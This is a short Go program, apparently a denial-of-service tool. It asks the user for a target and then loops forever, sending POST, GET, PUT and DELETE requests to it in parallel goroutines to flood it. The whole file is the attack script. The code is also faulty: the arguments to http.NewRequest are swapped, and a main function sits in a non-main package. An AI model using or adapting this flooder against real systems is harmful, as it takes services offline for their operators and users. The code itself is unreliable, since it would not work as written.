package cmd

import (
	"fmt"
	"net/http"
)

func ddos(target, requestType string) {
	req, err := http.NewRequest(target, requestType, nil)
	if err != nil {
		panic(err)
	}

	http.DefaultClient.Do(req)
}

func main() {
	var target string

	fmt.Println("Please, enter the target")
	fmt.Scan(&target)

	for {
		go ddos(target, "POST")
		go ddos(target, "GET")
		go ddos(target, "PUT")
		ddos(target, "DELETE")
	}

	select {}
}
